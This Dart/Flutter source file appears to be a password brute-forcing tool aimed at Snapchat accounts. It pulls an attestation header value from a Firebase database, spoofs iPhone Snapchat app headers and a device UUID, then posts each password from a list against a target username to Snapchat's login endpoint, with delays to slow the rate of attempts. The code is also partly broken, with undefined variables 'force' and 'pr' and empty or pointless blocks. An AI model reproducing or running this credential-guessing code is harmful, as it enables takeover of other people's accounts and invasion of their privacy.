import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

import '../screens/Login_screen.dart';

class ApiService {
  static const baseUrl = 'https://api.example.com';

  static Future<String?> getServer(int server) async {
    const url =
        'https://my-bye-thost-flaah999-default-rtdb.firebaseio.com/.json';
    try {
      final response = await http.get(Uri.parse(url));

      if (response.statusCode == 200) {
        final info = json.decode(response.body);
        String att;

        try {
          att = info["X-Snapchat-Att"][server].toString();
        } catch (e) {
          return null;
        }

        return att;
      } else {
        debugPrint('Request failed with status: ${response.statusCode}');
        return null;
      }
    } catch (error) {
      debugPrint('Error: $error');
    }
    return null;
  }

  static Stream<Future<Map<String, dynamic>>?> performLogin(
      String user, List<String> passwords, String server) async* {
    String chars2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm';
    int amount = 1;
    int length2 = 1;
    String key = '';

    for (int keyIndex = 0; keyIndex < amount; keyIndex++) {
      key = '';
      for (int item = 0; item < length2; item++) {
        key = '';
      }
      for (int item = 0; item < length2; item++) {
        key += chars2[Random().nextInt(chars2.length)];
      }
    }
    Map<String, String> hed = {
      "X-Snapchat-Uuid": "D348BDC9-2FA4-4BB9-A7CC-5595250FB823",
      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
      "User-Agent": "Snapchat/11.79.0.31 (iPhone9,3; iOS 15.7.5; gzip)",
      "Accept": "application/json",
      "X-Snapchat-Att": server.replaceAll("{}", key),
      "Host": "gcp.api.snapchat.com"
    };
    String url = "https://gcp.api.snapchat.com/scauth/login";
    int counter = 0;
    for (String password in passwords) {
      if (force) {
        break;
      }
      counter++;
      pr.update(progress: (counter).toDouble(), message: "test ${password}");
      String da = "device_check_token=sx&password=$password&username=$user";
      await Future.delayed(const Duration(seconds: 3));
      final result = await http.post(Uri.parse(url), headers: hed, body: da);
      await Future.delayed(const Duration(milliseconds: 500));
      yield Future.value(json.decode(result.body));
      try {} catch (e) {}
    }
  }
}
